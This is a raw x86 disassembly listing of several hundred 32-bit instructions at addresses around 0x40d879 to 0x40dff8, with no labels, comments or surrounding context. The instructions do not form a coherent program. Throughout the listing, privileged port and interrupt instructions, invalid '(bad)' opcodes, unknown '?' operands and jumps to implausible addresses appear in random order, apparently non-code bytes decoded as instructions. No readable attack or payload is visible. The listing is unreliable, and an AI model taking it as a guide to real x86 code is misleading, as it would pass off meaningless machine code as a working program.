  40d879:	enter  0x7bc6,0x9e
  40d87d:	lds    eax,FWORD PTR [ecx+0x40]
  40d880:	mov    ah,0x21
  40d882:	cmp    esp,DWORD PTR [ebx-0x567d7802]
  40d888:	sti    
  40d889:	dec    esp
  40d88a:	dec    ebx
  40d88b:	and    DWORD PTR [edi+eiz*1-0x3b],edx
  40d88f:	in     eax,0x70
  40d891:	jns    0x40d848
  40d893:	in     eax,dx
  40d894:	fcmovnb st,st(4)
  40d896:	aaa    
  40d897:	ja     0x40d906
  40d899:	and    BYTE PTR [esi-0xadf00be],bl
  40d89f:	jl     0x40d888
  40d8a1:	frstor [edi-0x2305ad0c]
  40d8a7:	arpl   WORD PTR [eax+0x10],bx
  40d8aa:	jne    0x40d8db
  40d8ac:	loopne 0x40d83f
  40d8ae:	pusha  
  40d8af:	sti    
  40d8b0:	pop    ebx
  40d8b1:	cmp    esi,DWORD PTR [ebx+0x4e]
  40d8b4:	mov    DWORD PTR [edx+ebp*8-0x350ac980],esp
  40d8bb:	test   al,0xc4
  40d8bd:	push   ebx
  40d8be:	pop    esi
  40d8bf:	add    eax,ebp
  40d8c1:	push   eax
  40d8c2:	leave  
  40d8c3:	stc    
  40d8c4:	outs   dx,BYTE PTR ds:[esi]
  40d8c5:	xchg   DWORD PTR [eax],ebp
  40d8c7:	xlat   BYTE PTR ds:[ebx]
  40d8c8:	dec    esp
  40d8c9:	stos   BYTE PTR es:[edi],al
  40d8ca:	or     cl,0x67
  40d8cd:	mov    ds:0xece66c4c,al
  40d8d2:	mov    BYTE PTR [ecx-0x24],ah
  40d8d5:	xor    DWORD PTR [ecx+0x2c],0x6c
  40d8d9:	xor    eax,0x26831ec3
  40d8de:	aaa    
  40d8df:	mov    cl,0x76
  40d8e1:	sub    eax,0xbc3cc89c
  40d8e6:	mov    al,0xc8
  40d8e8:	es xchg edi,eax
  40d8ea:	fldenv [eax+0x27]
  40d8ed:	test   al,0xb2
  40d8ef:	test   esi,esi
  40d8f1:	mov    ebx,DWORD PTR [ebx+0x4c]
  40d8f4:	inc    esi
  40d8f5:	xchg   edx,eax
  40d8f6:	mov    al,ds:0x12aa3d0e
  40d8fb:	cmp    al,0xad
  40d8fd:	push   ecx
  40d8fe:	data16 fld TBYTE PTR [edx]
  40d901:	std    
  40d902:	shl    bh,1
  40d904:	add    ah,bh
  40d906:	mov    edx,0xa354a91
  40d90b:	gs popa 
  40d90d:	dec    ebp
  40d90e:	bound  edx,QWORD PTR [ebx+0x567d7435]
  40d914:	adc    ebx,ebx
  40d916:	mov    fs,WORD PTR [esi+0x1c]
  40d919:	cwde   
  40d91a:	enter  0x1e80,0x4d
  40d91e:	lods   al,BYTE PTR ds:[esi]
  40d91f:	test   DWORD PTR [edx],eax
  40d921:	outs   dx,DWORD PTR ds:[esi]
  40d922:	out    0xdb,eax
  40d924:	jg     0x40d929
  40d926:	jno    0x40d925
  40d928:	mov    edx,0x2970cf5f
  40d92d:	mov    dh,0xb0
  40d92f:	and    bh,BYTE PTR [eax+0x15a460d4]
  40d935:	sbb    eax,0xde932ada
  40d93a:	stc    
  40d93b:	jp     0x40d8d4
  40d93d:	sub    DWORD PTR [esi],esi
  40d93f:	add    eax,0xd603bd4a
  40d944:	sbb    BYTE PTR [esi+0x2b],cl
  40d947:	push   cs
  40d948:	or     dh,dl
  40d94a:	cmp    esp,DWORD PTR [edx]
  40d94c:	mov    ch,0x87
  40d94e:	mov    ax,ds:0x41f6dc32
  40d954:	rcl    BYTE PTR [edi+0x14],1
  40d957:	(bad)  
  40d958:	gs loopne 0x40d9d4
  40d95b:	es pop ss
  40d95d:	inc    esi
  40d95e:	imul   DWORD PTR [eax-0x47]
  40d961:	hlt    
  40d962:	sub    BYTE PTR ds:0xab1846a2,dl
  40d968:	aam    0x1d
  40d96a:	mov    dl,0x97
  40d96c:	scas   eax,DWORD PTR es:[edi]
  40d96d:	sahf   
  40d96e:	aas    
  40d96f:	lahf   
  40d970:	mov    esi,0xfa54cfe8
  40d975:	arpl   WORD PTR [edi+0x42],bp
  40d978:	push   eax
  40d979:	mov    esp,0x15521bb1
  40d97e:	hlt    
  40d97f:	rol    ecx,cl
  40d981:	loopne 0x40d92d
  40d983:	push   DWORD PTR [ecx+0x3a]
  40d986:	stos   DWORD PTR es:[edi],eax
  40d987:	test   al,0xc7
  40d989:	fisubr WORD PTR [ecx-0x11469e16]
  40d98f:	push   edi
  40d990:	andnps xmm3,XMMWORD PTR [eax+ecx*2]
  40d994:	xor    BYTE PTR [eax],bh
  40d996:	xchg   edx,eax
  40d997:	shl    bl,0x56
  40d99a:	jmp    0x40da02
  40d99c:	retf   0x69b6
  40d99f:	inc    edi
  40d9a0:	sar    esi,cl
  40d9a2:	hlt    
  40d9a3:	mov    cl,0x3b
  40d9a5:	fwait
  40d9a6:	rcl    DWORD PTR [esi],0xbc
  40d9a9:	ret    
  40d9aa:	jmp    0x40da1b
  40d9ac:	daa    
  40d9ad:	ja     0x40da1c
  40d9af:	cmp    DWORD PTR [ecx-0x4ef9eb30],esp
  40d9b5:	mov    ebp,0x96735761
  40d9ba:	js     0x40d9ca
  40d9bc:	xor    eax,0x47f15ca9
  40d9c1:	adc    bl,bh
  40d9c3:	mov    BYTE PTR [ecx+0x46],0xd4
  40d9c7:	into   
  40d9c8:	sub    BYTE PTR [ecx-0x7bbc5528],dh
  40d9ce:	and    al,0x85
  40d9d0:	push   edi
  40d9d1:	shl    DWORD PTR [edi+0x65],cl
  40d9d4:	dec    eax
  40d9d5:	lock arpl WORD PTR [edx+0x47],dx
  40d9d9:	cmp    DWORD PTR [edi-0x75ad9b41],esi
  40d9df:	(bad)  [esi]
  40d9e1:	xchg   ecx,eax
  40d9e2:	sub    eax,0x6e81465e
  40d9e7:	pop    ebp
  40d9e8:	mov    dh,0x58
  40d9ea:	(bad)  [ecx]
  40d9ec:	pop    edi
  40d9ed:	adc    cl,BYTE PTR [ebp+edx*1+0x37]
  40d9f1:	enter  0x3518,0xca
  40d9f5:	xchg   ebx,eax
  40d9f6:	dec    esp
  40d9f7:	std    
  40d9f8:	cmp    DWORD PTR [edx+0x53],ecx
  40d9fb:	jl     0x40da79
  40d9fd:	add    esp,0x2721d383
  40da03:	adc    esp,DWORD PTR [edi-0x39]
  40da06:	xchg   DWORD PTR [eax+ebp*8+0xc],edi
  40da0a:	sub    al,ch
  40da0c:	dec    eax
  40da0d:	pop    ebx
  40da0e:	inc    esi
  40da0f:	push   ds
  40da10:	sbb    ebp,DWORD PTR [edi]
  40da12:	loopne 0x40da4c
  40da14:	mov    eax,0xfe5ef537
  40da19:	mov    al,0xd0
  40da1b:	mov    ah,0xab
  40da1d:	rcl    dl,1
  40da1f:	data16 mov BYTE PTR [ecx+0x3395afa7],bh
  40da26:	iret   
  40da27:	imul   ebx,DWORD PTR [edx-0x38],0x2
  40da2b:	sbb    bh,bl
  40da2d:	mov    eax,0x73a07f04
  40da32:	out    dx,eax
  40da33:	cmp    ch,dh
  40da35:	mov    dh,0x69
  40da37:	dec    esi
  40da38:	data16 in al,0x28
  40da3b:	ja     0x40da49
  40da3d:	into   
  40da3e:	cli    
  40da3f:	cmp    eax,DWORD PTR [esp+ecx*1+0x4f3fab30]
  40da46:	arpl   bx,di
  40da48:	jo     0x40da13
  40da4a:	in     al,dx
  40da4b:	outs   dx,BYTE PTR ds:[esi]
  40da4c:	sti    
  40da4d:	jae    0x40dacb
  40da4f:	inc    esp
  40da50:	push   eax
  40da51:	scas   eax,DWORD PTR es:[edi]
  40da52:	icebp  
  40da53:	cmp    esi,eax
  40da55:	xor    dl,BYTE PTR [eax+0x4f3663f2]
  40da5b:	mov    bl,0x9e
  40da5d:	test   BYTE PTR [edi-0x1f82296],0x76
  40da64:	adc    eax,0x2ea3c0e0
  40da69:	cmp    edi,DWORD PTR [ebp+0x9832706]
  40da6f:	dec    ebp
  40da70:	push   0xffffffd0
  40da72:	mov    BYTE PTR [ebx-0x4],al
  40da75:	push   ds
  40da76:	add    eax,0x103ecdad
  40da7b:	xor    DWORD PTR cs:[ebx],esp
  40da7e:	push   es
  40da7f:	pop    esp
  40da80:	int3   
  40da81:	mov    ecx,0x1f11befe
  40da86:	pop    ss
  40da87:	jl     0x40da2d
  40da89:	imul   esp
  40da8b:	push   esp
  40da8c:	add    dl,BYTE PTR [ebx-0x29]
  40da8f:	sbb    DWORD PTR [edx-0xcec3cd6],0x89e4f068
  40da99:	jns    0x40db14
  40da9b:	xchg   edi,eax
  40da9c:	out    dx,eax
  40da9d:	sbb    dl,BYTE PTR [edx-0x14]
  40daa0:	dec    ecx
  40daa1:	jmp    0x40db22
  40daa3:	mov    cl,0x71
  40daa5:	outs   dx,BYTE PTR ds:[esi]
  40daa6:	mov    ch,0xdc
  40daa8:	sti    
  40daa9:	in     eax,0xe7
  40daab:	sub    BYTE PTR [ecx-0x59],0x5d
  40daaf:	cmp    ebx,esp
  40dab1:	out    dx,al
  40dab2:	sub    ch,BYTE PTR [esp+ebp*2]
  40dab5:	je     0x40db2d
  40dab7:	add    DWORD PTR [esi-0x2d],ebx
  40daba:	mov    ebx,0x1ddf0c5a
  40dabf:	imul   esi,DWORD PTR [eax+edi*2-0x27],0x56f9c3f6
  40dac7:	push   0xffffff84
  40dac9:	cmp    eax,0xd7f89581
  40dace:	mov    BYTE PTR ds:0xb1ffb4fb,ah
  40dad4:	push   0x6a
  40dad6:	repnz pop ebp
  40dad8:	repz out 0xbc,al
  40dadb:	fstp   DWORD PTR [eax+0x3]
  40dade:	sbb    eax,DWORD PTR [edx+0xdb37290]
  40dae4:	pop    ebx
  40dae5:	push   eax
  40dae6:	mov    ?,WORD PTR [ebp+0x47]
  40dae9:	aaa    
  40daea:	mov    ebp,0x28143d44
  40daef:	sub    bl,BYTE PTR [ebx-0x13]
  40daf2:	dec    edx
  40daf3:	mov    bl,0xde
  40daf5:	pop    edx
  40daf6:	xorps  xmm4,xmm0
  40daf9:	mov    ch,0x45
  40dafb:	dec    ecx
  40dafc:	in     eax,dx
  40dafd:	pop    ebp
  40dafe:	fucomp st(1)
  40db00:	adc    BYTE PTR [ecx-0x20],0x5
  40db04:	leave  
  40db05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db06:	jle    0x40daa4
  40db08:	sub    BYTE PTR [esi],0xf4
  40db0b:	mov    fs,edx
  40db0d:	pop    ss
  40db0e:	xor    DWORD PTR ds:0x93134792,ecx
  40db14:	add    esi,esp
  40db16:	push   ds
  40db17:	dec    ebp
  40db18:	loope  0x40dadb
  40db1a:	jle    0x40db39
  40db1c:	sbb    dh,BYTE PTR [ecx+0x25ee5a46]
  40db22:	pop    ebp
  40db23:	pop    ecx
  40db24:	mov    ebx,0x9520c823
  40db29:	test   eax,0x9a45cdcc
  40db2e:	shl    BYTE PTR [edx+0x35],1
  40db31:	bound  edi,QWORD PTR [ebx]
  40db33:	inc    ebp
  40db34:	pop    ds
  40db35:	scas   al,BYTE PTR es:[edi]
  40db36:	pop    edx
  40db37:	ds scas al,BYTE PTR es:[edi]
  40db39:	sbb    BYTE PTR [esp+eax*8],ah
  40db3c:	dec    ebx
  40db3d:	or     eax,0x16fb3b6f
  40db42:	sbb    eax,0x16ec3c24
  40db47:	jecxz  0x40db17
  40db49:	shrd   DWORD PTR [eax+edx*8-0x7b05f7f5],esp,cl
  40db51:	stc    
  40db52:	adc    eax,0x75af63ee
  40db57:	add    BYTE PTR [edi],dl
  40db59:	add    edx,0x3b
  40db5c:	mov    eax,ds:0xc077bd91
  40db61:	cmp    eax,0x86b76e6d
  40db66:	dec    esi
  40db67:	cmp    BYTE PTR [ecx],ch
  40db69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db6a:	jg     0x40db53
  40db6c:	xchg   BYTE PTR [edi+0x32696ee5],ah
  40db72:	add    dl,BYTE PTR [ebp+0x36]
  40db75:	ins    BYTE PTR es:[edi],dx
  40db76:	(bad)  
  40db78:	mov    bl,0xa0
  40db7a:	test   al,0x8b
  40db7c:	int    0xb6
  40db7e:	sub    edi,0xb86097dc
  40db84:	adc    esp,ebx
  40db86:	ins    BYTE PTR es:[edi],dx
  40db87:	gs pop es
  40db89:	int3   
  40db8a:	stc    
  40db8b:	adc    al,0xa7
  40db8d:	jae    0x40db55
  40db8f:	out    0xc2,eax
  40db91:	jmp    0x2e20:0x51ba9f3c
  40db98:	fisubr WORD PTR [ecx]
  40db9a:	in     al,dx
  40db9b:	(bad)  
  40db9c:	push   cs
  40db9d:	mov    cl,0x41
  40db9f:	add    esi,DWORD PTR [ecx+0x47]
  40dba2:	scas   eax,DWORD PTR es:[edi]
  40dba3:	xchg   esp,eax
  40dba4:	push   es
  40dba5:	(bad)  
  40dba6:	mov    ebx,0x8d0440bb
  40dbab:	cmc    
  40dbac:	mov    WORD PTR [ebx+edx*4+0x4068bbca],es
  40dbb3:	jno    0x40db9e
  40dbb5:	or     DWORD PTR [ecx-0x39a01c6e],esi
  40dbbb:	sbb    al,0xe6
  40dbbd:	sub    eax,0x3c064c17
  40dbc2:	xchg   ebx,eax
  40dbc3:	stos   DWORD PTR es:[edi],eax
  40dbc4:	cmc    
  40dbc5:	and    BYTE PTR [esi+0x3b],bl
  40dbc8:	xlat   BYTE PTR ds:[ebx]
  40dbc9:	repnz mov ebp,ebp
  40dbcc:	repz sti 
  40dbce:	xchg   esi,eax
  40dbcf:	mov    al,0x7e
  40dbd1:	push   ecx
  40dbd2:	neg    BYTE PTR [ecx+0x74]
  40dbd5:	mov    edx,0x514c473e
  40dbda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbdb:	add    ebp,DWORD PTR [edx]
  40dbdd:	xchg   DWORD PTR [ebp+0x6d],ebx
  40dbe0:	jge    0x40dc60
  40dbe2:	dec    esi
  40dbe3:	or     esp,ebp
  40dbe5:	popf   
  40dbe6:	jmp    0x40dc22
  40dbe8:	push   eax
  40dbe9:	fdiv   QWORD PTR [eax-0x8ad61b4]
  40dbef:	sub    al,BYTE PTR [edx+ecx*4-0x32]
  40dbf3:	cld    
  40dbf4:	fild   DWORD PTR [ebx]
  40dbf6:	sar    BYTE PTR [esi+edi*2-0x2c],cl
  40dbfa:	xor    esp,DWORD PTR [edi-0x51]
  40dbfd:	cmp    DWORD PTR [edi+0x5c],ebp
  40dc00:	pusha  
  40dc01:	inc    esi
  40dc02:	cld    
  40dc03:	ins    DWORD PTR es:[edi],dx
  40dc04:	mov    eax,ds:0xde50ddf4
  40dc09:	ds dec ecx
  40dc0b:	push   ebx
  40dc0c:	cmp    edi,DWORD PTR [esi]
  40dc0e:	mov    ch,0xc5
  40dc10:	jl     0x40db93
  40dc12:	cs push esp
  40dc14:	mov    esi,0xf4dbb3d9
  40dc19:	into   
  40dc1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc1c:	jmp    0x40dc26
  40dc1e:	mov    eax,ds:0x8c1db3a0
  40dc23:	push   ds
  40dc24:	jge    0x40dc37
  40dc26:	adc    bl,BYTE PTR ss:[edx+0x726f2114]
  40dc2d:	xor    ax,0x6bef
  40dc31:	repz lock mov WORD PTR [edi],ss
  40dc35:	inc    edi
  40dc36:	mov    eax,ds:0x6a50eb5f
  40dc3b:	fs or  edx,ebx
  40dc3e:	clc    
  40dc3f:	cli    
  40dc40:	cli    
  40dc41:	or     BYTE PTR [edi-0x125832f4],dh
  40dc47:	jno    0x40dc54
  40dc49:	push   ecx
  40dc4a:	prefetchw BYTE PTR [ebx+0x50]
  40dc4e:	iret   
  40dc4f:	push   ss
  40dc50:	cmp    BYTE PTR [ecx-0x29],ch
  40dc53:	and    ebx,DWORD PTR [ebx-0x3bc9ed3a]
  40dc59:	mov    edx,0x43c730df
  40dc5e:	xchg   ebp,eax
  40dc5f:	dec    eax
  40dc60:	test   eax,0xf816fc40
  40dc65:	fs pop ss
  40dc67:	jb     0x40dc9b
  40dc69:	xchg   DWORD PTR [ecx-0x1f02fa34],eax
  40dc6f:	outs   dx,DWORD PTR ds:[esi]
  40dc70:	sbb    ah,BYTE PTR [ecx-0x50]
  40dc73:	test   BYTE PTR [ecx+eiz*2-0x3e55834d],dl
  40dc7a:	fmulp  st(3),st
  40dc7c:	imul   edi,DWORD PTR [edi-0x116d58f3],0xb540923d
  40dc86:	sub    esp,DWORD PTR [ecx-0x54]
  40dc89:	jp     0x40dc4b
  40dc8b:	data16 jl 0x40dc7e
  40dc8e:	and    DWORD PTR [ebx+0x25],ebx
  40dc91:	pop    ss
  40dc92:	ficom  WORD PTR [esi]
  40dc94:	lea    ebx,[ecx+0x44]
  40dc97:	pusha  
  40dc98:	ds aas 
  40dc9a:	pop    ds
  40dc9b:	and    ebp,DWORD PTR [ebp-0x14]
  40dc9e:	xchg   DWORD PTR [eiz*8-0x26d06271],esp
  40dca5:	or     eax,0x275f198
  40dcaa:	aas    
  40dcab:	jp     0x40dc50
  40dcad:	mov    ah,0x35
  40dcaf:	mov    es,WORD PTR ds:0x5db7a007
  40dcb5:	adc    cl,ah
  40dcb7:	std    
  40dcb8:	xor    dh,BYTE PTR [ebx+0x1b]
  40dcbb:	push   0xffffffc4
  40dcbd:	push   esp
  40dcbe:	call   0x68346b99
  40dcc3:	mov    esi,0x68bf9381
  40dcc8:	jo     0x40dc85
  40dcca:	iret   
  40dccb:	dec    eax
  40dccc:	mov    eax,ds:0x6cab865a
  40dcd1:	dec    edi
  40dcd2:	dec    ebx
  40dcd3:	(bad)  
  40dcd4:	inc    edi
  40dcd5:	mov    esp,0xde6eb556
  40dcda:	sbb    al,0xb5
  40dcdc:	jmp    0x297e7b01
  40dce1:	(bad)  
  40dce2:	push   ds
  40dce3:	fwait
  40dce4:	vpsrld xmm0,xmm2,XMMWORD PTR [edx+0x4cc47556]
  40dcec:	(bad)  
  40dced:	and    eax,0x634ac1ca
  40dcf2:	or     al,0x90
  40dcf4:	or     eax,0x63c59853
  40dcf9:	out    dx,al
  40dcfa:	and    eax,eax
  40dcfc:	shr    BYTE PTR [eax],1
  40dcfe:	mov    DWORD PTR [edi],ebx
  40dd00:	pop    ds
  40dd01:	cmp    DWORD PTR [ecx+ebx*8-0x6a],ebp
  40dd05:	fs es sub al,0x8a
  40dd09:	repz pop ebx
  40dd0b:	and    ecx,DWORD PTR [ecx+0x52cfa30e]
  40dd11:	fisubr DWORD PTR [ebx+0x299482c9]
  40dd17:	and    esp,DWORD PTR [ebp-0x46]
  40dd1a:	(bad)  
  40dd1b:	js     0x40dd85
  40dd1d:	inc    edx
  40dd1e:	push   eax
  40dd1f:	test   al,0xad
  40dd21:	lock cmp eax,0x70c74aa
  40dd27:	xchg   esi,eax
  40dd28:	push   ebx
  40dd29:	(bad)  
  40dd2a:	push   ecx
  40dd2b:	ja     0x40dd6f
  40dd2d:	inc    ecx
  40dd2e:	mov    ebp,0xfba8e33
  40dd33:	mov    cl,0xda
  40dd35:	inc    ecx
  40dd36:	cmp    bh,BYTE PTR [esi+0x67]
  40dd39:	ret    0x487f
  40dd3c:	cmp    DWORD PTR [eax+0x73],0xffffffd7
  40dd40:	jne    0x40ddb8
  40dd42:	push   ss
  40dd43:	jecxz  0x40dd0d
  40dd45:	jmp    0x4c34ca35
  40dd4a:	cmp    BYTE PTR [edx],ah
  40dd4c:	and    BYTE PTR [ebx-0x7d],bl
  40dd4f:	dec    ecx
  40dd50:	mov    DWORD PTR [ecx+0x4ca6df59],esi
  40dd56:	jmp    0x40dd1c
  40dd58:	dec    ebp
  40dd59:	jp     0x40dcf0
  40dd5b:	adc    DWORD PTR [edi],edi
  40dd5d:	mov    al,ds:0xab63d17f
  40dd62:	dec    esp
  40dd63:	mov    eax,0x3eb4f526
  40dd68:	jbe    0x40dd4c
  40dd6a:	fs jge 0x40ddb6
  40dd6d:	adc    DWORD PTR [esi],0x3202474b
  40dd73:	pop    ecx
  40dd74:	xor    dh,BYTE PTR es:[ecx]
  40dd77:	fsubr  DWORD PTR [edi-0x35]
  40dd7a:	xchg   edx,eax
  40dd7b:	aas    
  40dd7c:	fsub   QWORD PTR [eax]
  40dd7e:	xor    eax,0x1a6d9ab3
  40dd83:	je     0x40dd1b
  40dd85:	jns    0x40dd83
  40dd87:	mov    esp,0x7e50875e
  40dd8c:	jne    0x40ddd3
  40dd8e:	arpl   sp,di
  40dd90:	rcl    BYTE PTR [eax+0x0],1
  40dd93:	ins    BYTE PTR es:[edi],dx
  40dd94:	sbb    DWORD PTR [ebx+eiz*8-0x4d4eabe9],0xfffffff0
  40dd9c:	test   DWORD PTR [edx-0x6d],esi
  40dd9f:	add    ebp,DWORD PTR [ebx+edi*4+0x23e81516]
  40dda6:	shr    cl,cl
  40dda8:	jmp    0x30970760
  40ddad:	or     cl,BYTE PTR [edi-0x59]
  40ddb0:	mov    al,0x12
  40ddb2:	retf   
  40ddb3:	repnz push ss
  40ddb5:	pop    esi
  40ddb6:	data16 in al,0xb6
  40ddb9:	lock xor ecx,DWORD PTR [esi]
  40ddbc:	xchg   ebp,eax
  40ddbd:	ret    
  40ddbe:	mov    ?,WORD PTR [eax-0x92e3985]
  40ddc4:	stc    
  40ddc5:	cmc    
  40ddc6:	rcr    DWORD PTR [ecx],1
  40ddc8:	cmc    
  40ddc9:	pop    ecx
  40ddca:	dec    esi
  40ddcb:	fwait
  40ddcc:	cwde   
  40ddcd:	mov    BYTE PTR [ebp+0x6c],ch
  40ddd0:	mov    edi,0xdb21e78
  40ddd5:	in     eax,dx
  40ddd6:	dec    eax
  40ddd7:	or     edx,DWORD PTR [esi-0x6a87dd66]
  40dddd:	or     BYTE PTR [esi+0x5b],ah
  40dde0:	jmp    0x9910:0x2d331614
  40dde7:	je     0x40de32
  40dde9:	cmp    BYTE PTR [esi+0x17],dl
  40ddec:	or     ebx,DWORD PTR [eax+edi*8]
  40ddef:	enter  0xb582,0x2
  40ddf3:	jne    0x40de4f
  40ddf5:	and    ch,BYTE PTR [edi-0x19b9b8bf]
  40ddfb:	je     0x40dda0
  40ddfd:	loope  0x40ddad
  40ddff:	lea    ebx,ds:0x7e0656b8
  40de05:	in     eax,0x82
  40de07:	fiadd  WORD PTR [ecx]
  40de09:	ret    0x82a3
  40de0c:	ss jns 0x40ddae
  40de0f:	and    eax,ebp
  40de11:	and    eax,0xc90f1034
  40de16:	xchg   ecx,eax
  40de17:	or     al,0xde
  40de19:	and    ebp,ebx
  40de1b:	test   al,0xd0
  40de1d:	push   edi
  40de1e:	and    BYTE PTR [ecx+0x7cbec9cf],0xc7
  40de25:	mov    esp,0xd3123126
  40de2a:	int    0x1a
  40de2c:	adc    dh,BYTE PTR [esi+eax*4+0x47]
  40de30:	push   ecx
  40de31:	cmp    al,BYTE PTR [ebp-0x55]
  40de34:	mov    ds:0x3c729368,al
  40de39:	fsubp  st(4),st
  40de3b:	cmp    ah,dl
  40de3d:	cmp    BYTE PTR [edx-0x1e],0x9f
  40de41:	sub    al,0x4e
  40de43:	cmp    al,0xd0
  40de45:	sar    BYTE PTR [ebp-0x3],0xb4
  40de49:	inc    eax
  40de4a:	push   0x58
  40de4c:	add    dl,dh
  40de4e:	call   0x93e867e2
  40de53:	repz aas 
  40de55:	arpl   bx,si
  40de57:	sub    ebp,eax
  40de59:	sahf   
  40de5a:	mov    edi,0xd1bd9360
  40de5f:	(bad)  
  40de60:	(bad)  
  40de62:	cmp    ah,BYTE PTR [ebp-0x34dd99a4]
  40de68:	xchg   edi,eax
  40de69:	mov    bh,0xda
  40de6b:	jne    0x40ded8
  40de6d:	pop    ss
  40de6e:	jge    0x40dece
  40de70:	or     cl,ch
  40de72:	cmp    al,0x5a
  40de74:	sub    ebp,edi
  40de76:	sar    BYTE PTR [ecx+ebx*2+0xc89ecd6],cl
  40de7d:	push   ss
  40de7e:	je     0x40def6
  40de80:	loop   0x40de4f
  40de82:	scas   al,BYTE PTR es:[edi]
  40de83:	or     BYTE PTR [ebp+eax*2-0x600a1218],bl
  40de8a:	sbb    al,0x62
  40de8c:	xchg   ebx,esp
  40de8e:	and    al,0x41
  40de90:	rol    esi,0xe5
  40de93:	adc    esi,ecx
  40de95:	add    BYTE PTR [ebx+0x3401144d],ah
  40de9b:	test   DWORD PTR [ecx+0x39],ecx
  40de9e:	aam    0x54
  40dea0:	push   esi
  40dea1:	imul   DWORD PTR [esi+0x7]
  40dea4:	mov    DWORD PTR [ecx-0xd],ebx
  40dea7:	outs   dx,BYTE PTR ds:[esi]
  40dea8:	inc    eax
  40dea9:	es or  al,0xac
  40deac:	hlt    
  40dead:	pop    ss
  40deae:	cdq    
  40deaf:	call   0x5df8:0xbbeaaa7f
  40deb6:	sbb    eax,0x6cb5a4c1
  40debb:	or     al,0x16
  40debd:	cli    
  40debe:	outs   dx,DWORD PTR ds:[esi]
  40debf:	or     BYTE PTR [ecx+ebx*4+0x41],0xf1
  40dec4:	repz in al,dx
  40dec6:	mov    dl,0x31
  40dec8:	jmp    DWORD PTR [eax+0x2166f497]
  40dece:	jl     0x40de68
  40ded0:	mov    fs,WORD PTR [ecx+0x77]
  40ded3:	sar    dl,0x7
  40ded6:	unpckhps xmm5,XMMWORD PTR ds:0x8e26863a
  40dedd:	mov    ah,BYTE PTR [ecx+0x22a8297c]
  40dee3:	(bad)  
  40dee4:	jno    0x40de7d
  40dee6:	inc    edi
  40dee7:	ret    0x7b00
  40deea:	mov    eax,DWORD PTR [ecx-0x61]
  40deed:	dec    esi
  40deee:	scas   eax,DWORD PTR es:[edi]
  40deef:	jno    0x40df34
  40def1:	xchg   ecx,eax
  40def2:	xor    dl,ch
  40def4:	loopne 0x40df07
  40def6:	test   al,0xa6
  40def8:	mov    eax,0x3fb29df5
  40defd:	mov    edx,0xf9113165
  40df02:	adc    ecx,DWORD PTR [eax-0x54]
  40df05:	mov    ebx,0x3472c2fb
  40df0a:	add    edi,DWORD PTR [esi]
  40df0c:	push   cs
  40df0d:	adc    esp,ebx
  40df0f:	hlt    
  40df10:	shl    DWORD PTR [edx-0x53d9a414],1
  40df16:	push   edx
  40df17:	lods   eax,DWORD PTR ds:[esi]
  40df18:	fld    DWORD PTR [edi+0x3e]
  40df1b:	jb     0x40deff
  40df1d:	dec    esi
  40df1e:	retf   0xc436
  40df21:	xlat   BYTE PTR ds:[ebx]
  40df22:	aam    0x67
  40df24:	lods   al,BYTE PTR ds:[esi]
  40df25:	push   ds
  40df26:	xchg   DWORD PTR ds:0x7117eb86,eax
  40df2c:	or     bh,BYTE PTR [edi-0x36f027f2]
  40df32:	cmp    DWORD PTR [edi+0x3636ec92],esp
  40df38:	and    al,0xb4
  40df3a:	into   
  40df3b:	repnz fdiv QWORD PTR [eax-0x1b820aed]
  40df42:	push   eax
  40df43:	in     eax,dx
  40df44:	jmp    0x917df72
  40df49:	imul   ebp,DWORD PTR cs:[edi],0xed9fd32d
  40df50:	into   
  40df51:	jmp    0x7a352835
  40df56:	jno    0x40df8e
  40df58:	(bad)  
  40df59:	fnstsw WORD PTR [esi]
  40df5b:	rcl    BYTE PTR [ecx-0x75c501af],1
  40df61:	cdq    
  40df62:	mov    bh,0x33
  40df64:	add    ebp,DWORD PTR [eax+0x7d]
  40df67:	ret    
  40df68:	jnp    0x40df55
  40df6a:	neg    BYTE PTR [edi-0x75716376]
  40df70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df71:	loope  0x40df73
  40df73:	mov    dh,0xfc
  40df75:	fldenv [eax+0x56ff49fa]
  40df7b:	(bad)  
  40df7c:	jmp    0x80ac8a6b
  40df81:	pusha  
  40df82:	loope  0x40df18
  40df84:	dec    edx
  40df85:	inc    eax
  40df86:	repz and DWORD PTR ds:0x63f45c16,ecx
  40df8d:	repz mov ?,WORD PTR ds:0x40c9d82c
  40df94:	ins    DWORD PTR es:[edi],dx
  40df95:	mov    bh,BYTE PTR [ebx+ecx*1+0x6e]
  40df99:	data16 loopne 0x40df4b
  40df9c:	ret    0xca8a
  40df9f:	stos   BYTE PTR es:[edi],al
  40dfa0:	pop    ebx
  40dfa1:	sbb    bh,BYTE PTR [edx+ebp*8]
  40dfa4:	or     DWORD PTR [esi],edx
  40dfa6:	fist   WORD PTR [ebx-0x4e9abacd]
  40dfac:	inc    BYTE PTR [edi+0x54]
  40dfaf:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40dfb1:	mov    edi,0xfe79d2d
  40dfb6:	out    0x82,eax
  40dfb8:	dec    ecx
  40dfb9:	jno    0x40dfd2
  40dfbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfbc:	popf   
  40dfbd:	out    dx,eax
  40dfbe:	ret    
  40dfbf:	test   eax,0xc76324e9
  40dfc4:	out    dx,eax
  40dfc5:	push   ecx
  40dfc6:	test   al,0xd0
  40dfc8:	aam    0x60
  40dfca:	lds    edx,FWORD PTR [edx+0x71e3bd0d]
  40dfd0:	in     eax,dx
  40dfd1:	jmp    0x58b2c663
  40dfd6:	add    bh,BYTE PTR [edi]
  40dfd8:	dec    eax
  40dfd9:	sahf   
  40dfda:	xor    eax,0xcaebb13a
  40dfdf:	adc    ah,ch
  40dfe1:	fild   WORD PTR [edi+0x2e0e3d1e]
  40dfe7:	xchg   esp,eax
  40dfe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfe9:	repz dec esi
  40dfeb:	rol    bh,0x75
  40dfee:	ins    BYTE PTR es:[edi],dx
  40dfef:	pop    eax
  40dff0:	in     al,dx
  40dff1:	into   
  40dff2:	jle    0x40e003
  40dff4:	scas   al,BYTE PTR es:[edi]
  40dff5:	(bad)  
  40dff6:	push   ebp
  40dff7:	stc    
  40dff8:	repnz scas eax,DWORD PTR es:[edi]
